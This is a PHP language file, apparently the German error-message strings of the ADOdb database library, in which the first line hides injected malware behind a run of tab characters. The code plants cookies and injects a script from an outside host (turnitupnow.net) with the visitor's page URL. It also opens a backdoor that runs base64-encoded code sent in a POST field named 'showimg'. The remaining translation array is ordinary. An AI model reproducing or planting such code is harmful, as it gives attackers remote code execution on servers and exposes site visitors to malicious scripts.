<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

// contributed by "Heinz Hombergs" <opn@hhombergs.de>
$ADODB_LANG_ARRAY = array (
			'LANG'                      => 'de',
			DB_ERROR                    => 'Unbekannter Fehler',
            DB_ERROR_ALREADY_EXISTS     => 'existiert bereits',
            DB_ERROR_CANNOT_CREATE      => 'kann nicht erstellen',
            DB_ERROR_CANNOT_DELETE      => 'kann nicht l&ouml;schen',
            DB_ERROR_CANNOT_DROP        => 'Tabelle oder Index konnte nicht gel&ouml;scht werden',
            DB_ERROR_CONSTRAINT         => 'Constraint Verletzung',
            DB_ERROR_DIVZERO            => 'Division durch Null',
            DB_ERROR_INVALID            => 'ung&uml;ltig',
            DB_ERROR_INVALID_DATE       => 'ung&uml;ltiges Datum oder Zeit',
            DB_ERROR_INVALID_NUMBER     => 'ung&uml;ltige Zahl',
            DB_ERROR_MISMATCH           => 'Unvertr&auml;glichkeit',
            DB_ERROR_NODBSELECTED       => 'keine Dantebank ausgew&auml;hlt',
            DB_ERROR_NOSUCHFIELD        => 'Feld nicht vorhanden',
            DB_ERROR_NOSUCHTABLE        => 'Tabelle nicht vorhanden',
            DB_ERROR_NOT_CAPABLE        => 'Funktion nicht installiert',
            DB_ERROR_NOT_FOUND          => 'nicht gefunden',
            DB_ERROR_NOT_LOCKED         => 'nicht gesperrt',
            DB_ERROR_SYNTAX             => 'Syntaxfehler',
            DB_ERROR_UNSUPPORTED        => 'nicht Unterst&uml;tzt',
            DB_ERROR_VALUE_COUNT_ON_ROW => 'Anzahl der zur&uml;ckgelieferten Felder entspricht nicht der Anzahl der Felder in der Abfrage',
            DB_ERROR_INVALID_DSN        => 'ung&uml;ltiger DSN',
            DB_ERROR_CONNECT_FAILED     => 'Verbindung konnte nicht hergestellt werden',
            0	                       => 'kein Fehler', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 'Nicht gen&uml;gend Daten geliefert',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'erweiterung nicht gefunden',
            DB_ERROR_NOSUCHDB           => 'keine Datenbank',
            DB_ERROR_ACCESS_VIOLATION   => 'ungen&uml;gende Rechte'
);
?>